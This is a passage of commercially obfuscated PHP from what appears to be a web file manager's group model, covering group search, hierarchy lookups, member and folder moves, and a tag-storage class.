array($eÆ˜ÜºÔ‘‘, array($cİ—Äë—’ä[502] => array($cİ—Äë—’ä[380], $F¦£•Ó›Åâ))); } $eÆ˜ÜºÔ‘‘ = $this->parseWhereLike($eÆ˜ÜºÔ‘‘); $c­¼îÈæ´¿ = $this->_makeOrder()->where($eÆ˜ÜºÔ‘‘)->selectPage(20); goto E–âŸÑ–›; aƒ˜¦¸–­: if (!trim($e°î“Í¤¼á)) { return !1; } $e°î“Í¤¼á = str_replace($cİ—Äë—’ä[1774], $cİ—Äë—’ä[1775], $e°î“Í¤¼á); $eÆ˜ÜºÔ‘‘ = array($cİ—Äë—’ä[1689] => array($cİ—Äë—’ä[380], "{$e°î“Í¤¼á}\x25"), $cİ—Äë—’ä[28] => array($cİ—Äë—’ä[380], "\x25{$e°î“Í¤¼á}\x25"), $cİ—Äë—’ä[948] => $cİ—Äë—’ä[1776]); goto d•œ¥ä‚š˜; E–âŸÑ–›: $c­¼îÈæ´¿ = $c­¼îÈæ´¿ ? $c­¼îÈæ´¿ : array($cİ—Äë—’ä[367] => array(), $cİ—Äë—’ä[364] => array()); if (!$c­¼îÈæ´¿ || count($c­¼îÈæ´¿[$cİ—Äë—’ä[367]]) < 5 && Input::check($e°î“Í¤¼á, $cİ—Äë—’ä[316])) { goto c„ÉŞğ¯–¬; cº¼¼—Æƒ: $bÚ¨•—ßÉñ = array_merge($B‹Ä¬‡ğŒÎ, $D™Öñ¹ò‹, $c­¼îÈæ´¿[$cİ—Äë—’ä[367]]); $c­¼îÈæ´¿[$cİ—Äë—’ä[367]] = array_unique_by_key($bÚ¨•—ßÉñ, $cİ—Äë—’ä[1689]); $c­¼îÈæ´¿[$cİ—Äë—’ä[364]][$cİ—Äë—’ä[365]] = count($c­¼îÈæ´¿[$cİ—Äë—’ä[367]]); goto B›……ÌŞ†; c„ÉŞğ¯–¬: $eÑÓ›Çé‘µ = $this->groupChildrenAll($F±´çç£®Ò); $B‹Ä¬‡ğŒÎ = $this->_searchFromMeta($cİ—Äë—’ä[443], $e°î“Í¤¼á, 10, $eÑÓ›Çé‘µ); $D™Öñ¹ò‹ = $this->_searchFromMeta($cİ—Äë—’ä[444], $e°î“Í¤¼á, 10, $eÑÓ›Çé‘µ); goto cº¼¼—Æƒ; B›……ÌŞ†: $c­¼îÈæ´¿[$cİ—Äë—’ä[364]][$cİ—Äë—’ä[366]] = ceil($c­¼îÈæ´¿[$cİ—Äë—’ä[364]][$cİ—Äë—’ä[365]] / $c­¼îÈæ´¿[$cİ—Äë—’ä[364]][$cİ—Äë—’ä[361]]); goto F£œËÍˆöˆ; F£œËÍˆöˆ: } $this->_listDataApply($c­¼îÈæ´¿[$cİ—Äë—’ä[367]]); goto F‡‚º¼ç’; F‡‚º¼ç’: return $c­¼îÈæ´¿; goto eÏ›©Áù‰»; D·©Úñ—ê‹: $cİ—Äë—’ä =& $_SERVER[æ§›¦ÌáØ]; $e°î“Í¤¼á = $cµ“–Ÿö°[$cİ—Äë—’ä[1772]]; $F±´çç£®Ò = isset($cµ“–Ÿö°[$cİ—Äë—’ä[1773]]) ? $cµ“–Ÿö°[$cİ—Äë—’ä[1773]] : !1; goto aƒ˜¦¸–­; eÏ›©Áù‰»: } protected function groupChildrenAll($a¼šö²ó) { $E´ˆÛ¤ÁøŠ =& $_SERVER[æ§›¦ÌáØ]; if (!$a¼šö²ó) { return !1; } if (is_string($a¼šö²ó)) { $a¼šö²ó = array($a¼šö²ó); } $a‹‚†¸¥ó = $a¼šö²ó; foreach ($a¼šö²ó as $f©Ä†æÆ»à) { $fÃªœ´¹·ê = $this->getInfoSimple($f©Ä†æÆ»à); $cÙõ´„ßÇ³ = array($E´ˆÛ¤ÁøŠ[502] => array($E´ˆÛ¤ÁøŠ[380], $fÃªœ´¹·ê[$E´ˆÛ¤ÁøŠ[502]] . $f©Ä†æÆ»à . $E´ˆÛ¤ÁøŠ[526])); $EöÁƒÆ³ì“ = $this->field($E´ˆÛ¤ÁøŠ[1689])->where($cÙõ´„ßÇ³)->select(); $a‹‚†¸¥ó = array_merge($a‹‚†¸¥ó, array_to_keyvalue($EöÁƒÆ³ì“, $E´ˆÛ¤ÁøŠ[33], $E´ˆÛ¤ÁøŠ[1689])); } return array_unique($a‹‚†¸¥ó); } private function _searchFromMeta($FÆÎ«ÀŒ¸ï, $cŸ‡ŸŒíö¯, $f¤­•è“å, $fËë¡£¾“) { goto e¯ÊºÕ½ïÊ; A“óêÀ¬İ: $aƒ÷ÔÛÚ¢ = $this->parseWhereLike($aƒ÷ÔÛÚ¢); if ($fËë¡£¾“) { $aƒ÷ÔÛÚ¢[$C·ÃõÉ†´Á[1689]] = array($C·ÃõÉ†´Á[7], $fËë¡£¾“); } $BÅ“„®™êî = Model($C·ÃõÉ†´Á[1777])->where($aƒ÷ÔÛÚ¢)->limit($f¤­•è“å)->select(); goto A®›•¬†É£; e¯ÊºÕ½ïÊ: $C·ÃõÉ†´Á =& $_SERVER[æ§›¦ÌáØ]; $cŸ‡ŸŒíö¯ = strtolower($cŸ‡ŸŒíö¯); $aƒ÷ÔÛÚ¢ = array($C·ÃõÉ†´Á[93] => $FÆÎ«ÀŒ¸ï, $C·ÃõÉ†´Á[372] => array($C·ÃõÉ†´Á[380], "\45{$cŸ‡ŸŒíö¯}\x25")); goto A“óêÀ¬İ; A®›•¬†É£: if (!$BÅ“„®™êî) { return array(); } $BÅ“„®™êî = array_to_keyvalue($BÅ“„®™êî, $C·ÃõÉ†´Á[33], $C·ÃõÉ†´Á[1689]); $F‰ÅÏ¦ğß = $this->where(array($C·ÃõÉ†´Á[1767] => array($C·ÃõÉ†´Á[7], $BÅ“„®™êî)))->select(); goto A‡õØö; A‡õØö: if (!$F‰ÅÏ¦ğß) { return array(); } return $F‰ÅÏ¦ğß; goto fˆİÒ‚¡; fˆİÒ‚¡: } protected function _listDataApplyItem($eêãÌÏô¢Ü) { $aÜã¤êÑ¦— = array($eêãÌÏô¢Ü); $this->_listDataApply($aÜã¤êÑ¦—); return $aÜã¤êÑ¦—[0]; } protected function _listDataApply(&$C„¼ã±±Ú¹) { goto cÖË«©ùˆ; cÖË«©ùˆ: $B­¹ŠÌ¡ß¾ =& $_SERVER[æ§›¦ÌáØ]; if (!$C„¼ã±±Ú¹) { return; } $d’®×·ÙÙĞ = array_to_keyvalue($C„¼ã±±Ú¹, $B­¹ŠÌ¡ß¾[33], $B­¹ŠÌ¡ß¾[1689]); goto Cìé…‹•í™; FÉ›¨»™¸º: $this->_listAppendParent($C„¼ã±±Ú¹); $this->_listAppendSourceRoot($C„¼ã±±Ú¹, $d’®×·ÙÙĞ); goto D½àõØÛ®; Cìé…‹•í™: $this->_listAppendChildren($C„¼ã±±Ú¹); $this->_listAppendChildrenMember($C„¼ã±±Ú¹); $this->_listAppendMeta($C„¼ã±±Ú¹, $d’®×·ÙÙĞ); goto FÉ›¨»™¸º; D½àõØÛ®: } private function _listAppendChildren(&$B»²ÚñâÂ«) { goto B¨¿îø„ÂÑ; Fò½»»Ñº: $B½¾Ü—ĞÊµ = array($AĞîŞ˜÷[478], $AĞîŞ˜÷[1778] => $AĞîŞ˜÷[480]); $eÉÒÛ‡öé¬ = $this->field($B½¾Ü—ĞÊµ)->where($a Í‰ìíº)->group($AĞîŞ˜÷[478])->select(); $D—ÌÈÉ°› = array_to_keyvalue($eÉÒÛ‡öé¬, $AĞîŞ˜÷[478], $AĞîŞ˜÷[480]); goto F¿Î· ³È; B¨¿îø„ÂÑ: $AĞîŞ˜÷ =& $_SERVER[æ§›¦ÌáØ]; $E¹ß±Å‘ÁÑ = array_to_keyvalue($B»²ÚñâÂ«, $AĞîŞ˜÷[33], $AĞîŞ˜÷[1689]); $a Í‰ìíº = array($AĞîŞ˜÷[478] => array($AĞîŞ˜÷[7], $E¹ß±Å‘ÁÑ)); goto Fò½»»Ñº; F¿Î· ³È: foreach ($B»²ÚñâÂ« as &$a¢É‘¾ô—Î) { $C‘œßè«¸ = $a¢É‘¾ô—Î[$AĞîŞ˜÷[1689]]; $a¢É‘¾ô—Î[$AĞîŞ˜÷[1779]] = isset($D—ÌÈÉ°›[$C‘œßè«¸]) ? intval($D—ÌÈÉ°›[$C‘œßè«¸]) : !1; } unset($a¢É‘¾ô—Î); goto Få¹ÓèÛ¸Ù; Få¹ÓèÛ¸Ù: } private function _listAppendChildrenMember(&$d›«º¤Ùç) { goto d¼ˆè¸ö‘ƒ; d¼ˆè¸ö‘ƒ: $a„Š‰ÜÔÛ =& $_SERVER[æ§›¦ÌáØ]; $D’‹ì´‹÷ = array_to_keyvalue($d›«º¤Ùç, $a„Š‰ÜÔÛ[33], $a„Š‰ÜÔÛ[1689]); $d÷İ‘ëÕ‘ = array($a„Š‰ÜÔÛ[1689] => array($a„Š‰ÜÔÛ[7], $D’‹ì´‹÷)); goto aä½ŸÜ¦Şè; BŸ•„áˆÁ×: foreach ($d›«º¤Ùç as &$D¬í™Ú×¯) { $CŠ¯êïØãŒ = $D¬í™Ú×¯[$a„Š‰ÜÔÛ[1689]]; $D¬í™Ú×¯[$a„Š‰ÜÔÛ[1780]] = isset($D¡—Ñè‹Ë„[$CŠ¯êïØãŒ]) ? intval($D¡—Ñè‹Ë„[$CŠ¯êïØãŒ]) : !1; } unset($D¬í™Ú×¯); goto Båˆ·‹ Å½; aä½ŸÜ¦Şè: $B’”İÖŸ’‹ = array($a„Š‰ÜÔÛ[1689], $a„Š‰ÜÔÛ[1778] => $a„Š‰ÜÔÛ[480]); $dŠÚ†¹• = Model($a„Š‰ÜÔÛ[1770])->field($B’”İÖŸ’‹)->where($d÷İ‘ëÕ‘)->group($a„Š‰ÜÔÛ[1689])->select(); $D¡—Ñè‹Ë„ = array_to_keyvalue($dŠÚ†¹•, $a„Š‰ÜÔÛ[1689], $a„Š‰ÜÔÛ[480]); goto BŸ•„áˆÁ×; Båˆ·‹ Å½: } private function _listAppendMeta(&$EÖé¶ëØ, $cÀ›šƒÖê) { goto CÇºéØ¾ÓŠ; e¦õêáìº: foreach ($EÖé¶ëØ as &$FÓç§¦Ï”‡) { $FÓç§¦Ï”‡[$C¾è¾·ö[445]] = array(); if (isset($c®¾Œƒãó[$FÓç§¦Ï”‡[$C¾è¾·ö[1689]]])) { $FÓç§¦Ï”‡[$C¾è¾·ö[445]] = $c®¾Œƒãó[$FÓç§¦Ï”‡[$C¾è¾·ö[1689]]]; } } unset($FÓç§¦Ï”‡); goto AÁ‹œÁ‹®; CÇºéØ¾ÓŠ: $C¾è¾·ö =& $_SERVER[æ§›¦ÌáØ]; $dŞ´£´¢Êã = array($C¾è¾·ö[1689] => array($C¾è¾·ö[7], $cÀ›šƒÖê)); $c®¾Œƒãó = Model($C¾è¾·ö[1769])->where($dŞ´£´¢Êã)->select(); goto D’ªÚŒ¹‰ó; D’ªÚŒ¹‰ó: $c®¾Œƒãó = array_to_keyvalue_group($c®¾Œƒãó, $C¾è¾·ö[1689]); foreach ($c®¾Œƒãó as &$bÖ´¬¹ßë) { $bÖ´¬¹ßë = array_to_keyvalue($bÖ´¬¹ßë, $C¾è¾·ö[93], $C¾è¾·ö[372]); } unset($bÖ´¬¹ßë); goto e¦õêáìº; AÁ‹œÁ‹®: } protected function parentLevelArray($a®è¿ùëŠ¤) { $C…ƒçñĞğÏ =& $_SERVER[æ§›¦ÌáØ]; $a®è¿ùëŠ¤ = explode($C…ƒçñĞğÏ[47], trim($a®è¿ùëŠ¤, $C…ƒçñĞğÏ[47])); $a®è¿ùëŠ¤ = array_remove_value($a®è¿ùëŠ¤, $C…ƒçñĞğÏ[191]); return $a®è¿ùëŠ¤; } private function _listAppendParent(&$aÀ„ßšºƒ) { goto EËõ†çé»Ë; D«‚­ÏÛ›ƒ: if ($GLOBALS[$E«ê ¾“ªÖ[485]] == $E«ê ¾“ªÖ[87]) { $e£ˆŸÎÍ¶È = !1; } foreach ($aÀ„ßšºƒ as &$f—ŒáŸ‡Ë) { $c†˜™„¨Ï = $this->parentLevelArray($f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[502]]); $Eö…¹¬´ñî = $E«ê ¾“ªÖ[33]; foreach ($c†˜™„¨Ï as $eŸƒ“ÜôÄ¬ => $dôøÔïÜ½§) { if ($e£ˆŸÎÍ¶È && $eŸƒ“ÜôÄ¬ == 0) { continue; } $Eö…¹¬´ñî .= $d§°±ƒñÊ[$dôøÔïÜ½§] . $E«ê ¾“ªÖ[8]; } if ($c†˜™„¨Ï) { $Eö…¹¬´ñî .= $f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[28]]; } $f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[507]] = str_replace($E«ê ¾“ªÖ[510], $E«ê ¾“ªÖ[8], $Eö…¹¬´ñî); } unset($f—ŒáŸ‡Ë); goto B—ÀŸ¾‘ô÷; bÙßÍòôÊ: unset($f—ŒáŸ‡Ë); foreach ($d§°±ƒñÊ as $eŸƒ“ÜôÄ¬ => $E¸’¬«¡Ù) { if ($E¸’¬«¡Ù) { continue; } $c§”­™‘° = $this->getInfoSimple($eŸƒ“ÜôÄ¬); $d§°±ƒñÊ[$eŸƒ“ÜôÄ¬] = $c§”­™‘°[$E«ê ¾“ªÖ[28]]; } $e£ˆŸÎÍ¶È = $GLOBALS[$E«ê ¾“ªÖ[6]][$E«ê ¾“ªÖ[88]][$E«ê ¾“ªÖ[1781]]; goto D«‚­ÏÛ›ƒ; EËõ†çé»Ë: $E«ê ¾“ªÖ =& $_SERVER[æ§›¦ÌáØ]; $d§°±ƒñÊ = array(); foreach ($aÀ„ßšºƒ as &$f—ŒáŸ‡Ë) { $d§°±ƒñÊ[$f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[1689]]] = $f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[28]]; $c†˜™„¨Ï = $this->parentLevelArray($f—ŒáŸ‡Ë[$E«ê ¾“ªÖ[502]]); foreach ($c†˜™„¨Ï as $dôøÔïÜ½§) { if (!isset($d§°±ƒñÊ[$dôøÔïÜ½§])) { $d§°±ƒñÊ[$dôøÔïÜ½§] = 0; } } } goto bÙßÍòôÊ; B—ÀŸ¾‘ô÷: } private function _listAppendSourceRoot(&$cÍÒ‘±¿…¡, $f¾¥¬Û½ò½) { goto c‰ƒ¾ùÁ¯‚; f¡ƒ·Ä°: foreach ($cÍÒ‘±¿…¡ as &$BÌç¬ÙĞÖ) { $BÌç¬ÙĞÖ[$f’¿‘‚‡ø¡[85]] = $cÔ¥‘ Ê…[$BÌç¬ÙĞÖ[$f’¿‘‚‡ø¡[1689]]] ? $cÔ¥‘ Ê…[$BÌç¬ÙĞÖ[$f’¿‘‚‡ø¡[1689]]] : array(); } unset($BÌç¬ÙĞÖ); goto aº†Ê×ù×¯; D¥–­›òŠ: $cÔ¥‘ Ê… = Model($f’¿‘‚‡ø¡[783])->order($f’¿‘‚‡ø¡[1783])->field($C´–ÁÓ»Æ‰)->where($Eğµ¿ÕÎÚ÷)->select(); $cÔ¥‘ Ê… = array_to_keyvalue($cÔ¥‘ Ê…, $f’¿‘‚‡ø¡[484]); $cÔ¥‘ Ê… = array_remove_key($cÔ¥‘ Ê…, $f’¿‘‚‡ø¡[484]); goto f¡ƒ·Ä°; c‰ƒ¾ùÁ¯‚: $f’¿‘‚‡ø¡ =& $_SERVER[æ§›¦ÌáØ]; $Eğµ¿ÕÎÚ÷ = array($f’¿‘‚‡ø¡[404] => SourceModel::TYPE_GROUP, $f’¿‘‚‡ø¡[478] => 0, $f’¿‘‚‡ø¡[484] => array($f’¿‘‚‡ø¡[7], $f¾¥¬Û½ò½)); $C´–ÁÓ»Æ‰ = $f’¿‘‚‡ø¡[1782]; goto D¥–­›òŠ; aº†Ê×ù×¯: } protected function groupMerge($eğâ¤Ù½é¥) { $eğâ¤Ù½é¥ = array_values(array_unique($eğâ¤Ù½é¥)); $D•¤£´Ê­Œ = array(); for ($F¾æÚ²ÑÃ° = 0; $F¾æÚ²ÑÃ° < count($eğâ¤Ù½é¥); $F¾æÚ²ÑÃ°++) { $BºÌÛ¤óÆ† = !1; for ($fÜ ‹ŠÈÕ = 0; $fÜ ‹ŠÈÕ < count($eğâ¤Ù½é¥); $fÜ ‹ŠÈÕ++) { if ($F¾æÚ²ÑÃ° == $fÜ ‹ŠÈÕ) { continue; } if ($this->isParentOf($eğâ¤Ù½é¥[$fÜ ‹ŠÈÕ], $eğâ¤Ù½é¥[$F¾æÚ²ÑÃ°])) { $BºÌÛ¤óÆ† = !0; break; } } if (!$BºÌÛ¤óÆ†) { $D•¤£´Ê­Œ[] = $eğâ¤Ù½é¥[$F¾æÚ²ÑÃ°]; } } return $D•¤£´Ê­Œ; } protected function isParentOf($E¬ôƒƒ†, $d—¨™¤»Õï) { goto dŸÙ¬ŒÁÆß; Aİò­æ¡×é: $c¤‹Ò©ä‰ç = $this->getInfoSimple($d—¨™¤»Õï); $BÀÜ‚œò…µ = $E±òÃßš•[$dø«ƒÇöùÓ[502]] . $E¬ôƒƒ† . $dø«ƒÇöùÓ[47]; if (substr($c¤‹Ò©ä‰ç[$dø«ƒÇöùÓ[502]], 0, strlen($BÀÜ‚œò…µ)) == $BÀÜ‚œò…µ) { return !0; } goto D„Û×‚Äš…; D„Û×‚Äš…: return !1; goto A¿Ú…ªÑß“; dŸÙ¬ŒÁÆß: $dø«ƒÇöùÓ =& $_SERVER[æ§›¦ÌáØ]; if (!$E¬ôƒƒ† || !$d—¨™¤»Õï || $E¬ôƒƒ† == $d—¨™¤»Õï) { return !1; } $E±òÃßš• = $this->getInfoSimple($E¬ôƒƒ†); goto Aİò­æ¡×é; A¿Ú…ªÑß“: } public function groupShowRoot($Fæ«ƒ¡ŞÂµ, $C–è ö½‘ = false) { goto cƒµ¢ŠŒæ¥; bŞ‡¬»†×: $fÜŞ‡×ÅÙ¿ = $this->parentLevelArray($e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[502]]); $EØÙÛÛ‹ÁÅ = array($Fæ«ƒ¡ŞÂµ); if (count($fÜŞ‡×ÅÙ¿) == 0) { return $EØÙÛÛ‹ÁÅ; } goto E¬ÏØŸÉ¥È; cƒµ¢ŠŒæ¥: $a–¢‡¾„ˆÚ =& $_SERVER[æ§›¦ÌáØ]; $e¸†®„¡‚Ù = $this->getInfo($Fæ«ƒ¡ŞÂµ); if (!$e¸†®„¡‚Ù) { return array(); } goto bŞ‡¬»†×; b§ŠÖ¶—: return $EØÙÛÛ‹ÁÅ; goto F—­˜…Áá; E¬ÏØŸÉ¥È: if ($C–è ö½‘ && count($fÜŞ‡×ÅÙ¿) == 1) { return $EØÙÛÛ‹ÁÅ; } if (!$e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[445]] || !isset($e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[445]][$a–¢‡¾„ˆÚ[1765]]) || $e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[445]][$a–¢‡¾„ˆÚ[1765]] == $a–¢‡¾„ˆÚ[1739]) { return $this->groupShowRoot($fÜŞ‡×ÅÙ¿[count($fÜŞ‡×ÅÙ¿) - 1], $C–è ö½‘); } if ($e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[445]][$a–¢‡¾„ˆÚ[1765]] == $a–¢‡¾„ˆÚ[355]) { $fêØª°ëã = explode($a–¢‡¾„ˆÚ[47], $e¸†®„¡‚Ù[$a–¢‡¾„ˆÚ[445]][$a–¢‡¾„ˆÚ[1766]]); if ($fêØª°ëã) { $EØÙÛÛ‹ÁÅ = array_merge($EØÙÛÛ‹ÁÅ, $fêØª°ëã); } } goto b§ŠÖ¶—; F—­˜…Áá: } protected function resetParentLevel() { $A¿÷‰áô†¼ =& $_SERVER[æ§›¦ÌáØ]; $d…Á“ÅØñ = $A¿÷‰áô†¼[1689]; $f”¸¥²±§ = $this->select(); $f”¸¥²±§ = array_to_keyvalue($f”¸¥²±§, $d…Á“ÅØñ); foreach ($f”¸¥²±§ as $AÈ«øÆã¨Œ) { goto E¶¬ÄÙ»¾; Fİï‰ÆÌ³Ï: $DÛÒÏ´Ûõ[] = 0; $DÛÒÏ´Ûõ = $A¿÷‰áô†¼[47] . implode($A¿÷‰áô†¼[47], array_reverse($DÛÒÏ´Ûõ)) . $A¿÷‰áô†¼[47]; $this->setNamePinyin($AÈ«øÆã¨Œ[$d…Á“ÅØñ], $AÈ«øÆã¨Œ[$A¿÷‰áô†¼[28]]); goto Aó¶©£œ¹±; Aó¶©£œ¹±: $this->where(array($d…Á“ÅØñ => $AÈ«øÆã¨Œ[$d…Á“ÅØñ]))->save(array($A¿÷‰áô†¼[566] => $DÛÒÏ´Ûõ)); goto a®Ö­åŸ¸; E¶¬ÄÙ»¾: $aİ©Ø’°î = $AÈ«øÆã¨Œ; $DÛÒÏ´Ûõ = array(); while ($aİ©Ø’°î[$A¿÷‰áô†¼[478]] != 0) { $DÛÒÏ´Ûõ[] = $aİ©Ø’°î[$A¿÷‰áô†¼[478]]; $aİ©Ø’°î = $f”¸¥²±§[$aİ©Ø’°î[$A¿÷‰áô†¼[478]]]; } goto Fİï‰ÆÌ³Ï; a®Ö­åŸ¸: } return $f”¸¥²±§; } public function groupNameAuto($a¸è¥ñóÎ¾, $d…‘æ²É¸’) { $e¢‘Š›©‹ =& $_SERVER[æ§›¦ÌáØ]; $dªõ‡¨²È = $this->where(array($e¢‘Š›©‹[394] => $a¸è¥ñóÎ¾))->getField($e¢‘Š›©‹[28], !0); if (!$dªõ‡¨²È || !in_array($d…‘æ²É¸’, $dªõ‡¨²È)) { return $d…‘æ²É¸’; } for ($f°ˆµ”Œ–á = 1; $f°ˆµ”Œ–á <= count($dªõ‡¨²È) + 1; $f°ˆµ”Œ–á++) { $Cïœ„ğß†à = $d…‘æ²É¸’ . "\50{$f°ˆµ”Œ–á}\x29"; if (!in_array($Cïœ„ğß†à, $dªõ‡¨²È)) { return $Cïœ„ğß†à; } } } public function groupSwitch($b¼íéïÜˆÕ, $eàíÙÀ÷•Í) { goto Dµ‘à­ó¿Ú; f¢¿–ª: $aïƒìŞÈÜ = Model($FÊ´ãÖ…Ü”[1770])->where($b‰¿óôèàà)->select(); if (!$aïƒìŞÈÜ) { $aïƒìŞÈÜ = array(); } foreach ($aïƒìŞÈÜ as $EÃ¥ù‹ó¤) { $eĞ¾çÉ°Æº = $EÃ¥ù‹ó¤[$FÊ´ãÖ…Ü”[1520]]; $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[1520] => $eĞ¾çÉ°Æº, $FÊ´ãÖ…Ü”[1689] => $eàíÙÀ÷•Í); $D…í„„È¥¶ = Model($FÊ´ãÖ…Ü”[1770])->where($b‰¿óôèàà)->find(); if (!$D…í„„È¥¶) { $cÊ”–¨Öˆ = array($eàíÙÀ÷•Í => $EÃ¥ù‹ó¤[$FÊ´ãÖ…Ü”[1784]]); Model($FÊ´ãÖ…Ü”[519])->userGroupAdd($eĞ¾çÉ°Æº, $cÊ”–¨Öˆ); } Model($FÊ´ãÖ…Ü”[519])->userGroupRemove($eĞ¾çÉ°Æº, $b¼íéïÜˆÕ); } goto F¯ñ‘”Ê‚; Dµ‘à­ó¿Ú: $FÊ´ãÖ…Ü” =& $_SERVER[æ§›¦ÌáØ]; $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[1689] => array($FÊ´ãÖ…Ü”[7], array($b¼íéïÜˆÕ, $eàíÙÀ÷•Í))); $eÄ¢ãŸô«‹ = $this->where($b‰¿óôèàà)->select(); goto fŠ¢´ÖÔò; F¯ñ‘”Ê‚: $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[404] => 2, $FÊ´ãÖ…Ü”[478] => 0, $FÊ´ãÖ…Ü”[403] => 1, $FÊ´ãÖ…Ü”[484] => array($FÊ´ãÖ…Ü”[7], array($b¼íéïÜˆÕ, $eàíÙÀ÷•Í))); $bç»ÛÊ›° = Model($FÊ´ãÖ…Ü”[783])->where($b‰¿óôèàà)->field($FÊ´ãÖ…Ü”[1785])->select(); $bç»ÛÊ›° = array_to_keyvalue($bç»ÛÊ›°, $FÊ´ãÖ…Ü”[484], $FÊ´ãÖ…Ü”[395]); goto C’‘Ì»ùÑƒ; B÷Ö¼Îã„æ: $this->where(array($FÊ´ãÖ…Ü”[478] => $b¼íéïÜˆÕ))->save(array($FÊ´ãÖ…Ü”[478] => $eàíÙÀ÷•Í)); return !0; goto E›øÜ¼; C’‘Ì»ùÑƒ: $eÀùåÏ„ë = !empty($bç»ÛÊ›°[$b¼íéïÜˆÕ]) ? $bç»ÛÊ›°[$b¼íéïÜˆÕ] : !1; if ($eÀùåÏ„ë) { goto Añ—Ó½ÊˆŠ; BÖ‡¡¸ê…£: $D‹íÅ†à“Å = array($FÊ´ãÖ…Ü”[484] => $eàíÙÀ÷•Í); Model($FÊ´ãÖ…Ü”[1787])->where($b‰¿óôèàà)->save($D‹íÅ†à“Å); Model($FÊ´ãÖ…Ü”[1788])->where($b‰¿óôèàà)->save($D‹íÅ†à“Å); goto aùÒã³©ÀÀ; Añ—Ó½ÊˆŠ: if (!$bç»ÛÊ›°[$eàíÙÀ÷•Í]) { $bç»ÛÊ›°[$eàíÙÀ÷•Í] = Model($FÊ´ãÖ…Ü”[783])->groupRootAdd($eàíÙÀ÷•Í); } $a˜˜—À« = $bç»ÛÊ›°[$eàíÙÀ÷•Í]; $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[478] => $eÀùåÏ„ë); goto F¥ÔìÙ·ÛŠ; F¥ÔìÙ·ÛŠ: $bç»ÛÊ›° = Model($FÊ´ãÖ…Ü”[783])->where($b‰¿óôèàà)->field($FÊ´ãÖ…Ü”[1786])->select(); if (!$bç»ÛÊ›°) { $bç»ÛÊ›° = array(); } Model($FÊ´ãÖ…Ü”[783])->moveClearAuth = !1; goto b©ñ‡´ğÀ©; b©ñ‡´ğÀ©: foreach ($bç»ÛÊ›° as $f±°‡óÇ¿) { $D“ÑÙÂ«Â˜ = $f±°‡óÇ¿[$FÊ´ãÖ…Ü”[403]] == $FÊ´ãÖ…Ü”[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($FÊ´ãÖ…Ü”[783])->move($f±°‡óÇ¿[$FÊ´ãÖ…Ü”[395]], $a˜˜—À«, $D“ÑÙÂ«Â˜); } Model($FÊ´ãÖ…Ü”[783])->moveClearAuth = !0; $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[404] => 2, $FÊ´ãÖ…Ü”[484] => $b¼íéïÜˆÕ); goto BÖ‡¡¸ê…£; aùÒã³©ÀÀ: } $this->_changeChildLevel($eÄ¢ãŸô«‹[$b¼íéïÜˆÕ], $eÄ¢ãŸô«‹[$eàíÙÀ÷•Í], !0); goto B÷Ö¼Îã„æ; fŠ¢´ÖÔò: $eÄ¢ãŸô«‹ = array_to_keyvalue($eÄ¢ãŸô«‹, $FÊ´ãÖ…Ü”[1689]); if (!isset($eÄ¢ãŸô«‹[$b¼íéïÜˆÕ]) || !isset($eÄ¢ãŸô«‹[$eàíÙÀ÷•Í]) || $eÄ¢ãŸô«‹[$b¼íéïÜˆÕ][$FÊ´ãÖ…Ü”[478]] == 0) { return !1; } $b‰¿óôèàà = array($FÊ´ãÖ…Ü”[1689] => $b¼íéïÜˆÕ); goto f¢¿–ª; E›øÜ¼: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\141\166"; protected function cacheFunctionAlias($c×¿ÁéŒÖ) { $Eß¿å²¦’‹ =& $_SERVER[æ§›¦ÌáØ]; return array($Eß¿å²¦’‹[1789] => array($c×¿ÁéŒÖ[0], $Eß¿å²¦’‹[1790]), $Eß¿å²¦’‹[1791] => array($c×¿ÁéŒÖ[0], $Eß¿å²¦’‹[1792])); } protected function get($C×İŠ‡ëª…) { $F¾ğßÈò¤Ò =& $_SERVER[æ§›¦ÌáØ]; $DàŸà¬ö†ƒ = Model($F¾ğßÈò¤Ò[503])->metaGet($C×İŠ‡ëª…, $F¾ğßÈò¤Ò[1793]); $A„§á¬“¢ = json_decode($DàŸà¬ö†ƒ, !0); return $A„§á¬“¢ ? $A„§á¬“¢ : array($F¾ğßÈò¤Ò[1794] => $F¾ğßÈò¤Ò[87], $F¾ğßÈò¤Ò[367] => array()); } protected function set($c¶ö‘‰¦¤ñ, $FÆÅ¦­®) { $eöÌŸ³ğâÚ =& $_SERVER[æ§›¦ÌáØ]; $FÆÅ¦­® = $FÆÅ¦­® ? $FÆÅ¦­® : array($eöÌŸ³ğâÚ[1794] => $eöÌŸ³ğâÚ[87], $eöÌŸ³ğâÚ[367] => array()); Model($eöÌŸ³ğâÚ[503])->metaSet($c¶ö‘‰¦¤ñ, $eöÌŸ³ğâÚ[1793], json_encode($FÆÅ¦­®)); return Model($eöÌŸ³ğâÚ[503])->metaSet($c¶ö‘‰¦¤ñ, $eöÌŸ³ğâÚ[1793], json_encode($FÆÅ¦­®)); } protected function getByTagID($C…Ëá²¨Â, $dÆÅ³óó„š) { goto fôÅÈ¥…™‘; AŸ†”„Û¶: return is_array($f÷„É´æ£) ? $f÷„É´æ£ : !1; goto d§‘Šñ—­§; fôÅÈ¥…™‘: $aÙ”Ç‡Êì• =& $_SERVER[æ§›¦ÌáØ]; if (!$C…Ëá²¨Â || !$dÆÅ³óó„š) { return !1; } if (!Model($aÙ”Ç‡Êì•[503])->getInfoSimple($C…Ëá²¨Â)) { return !1; } goto fàÂ¢¦É; fàÂ¢¦É: $a‚¼¿ƒ»š¼ = $this->get($C…Ëá²¨Â); if (!$a‚¼¿ƒ»š¼ || !isset($a‚¼¿ƒ»š¼[$aÙ”Ç‡Êì•[367]])) { return !1; } $f÷„É´æ£ = 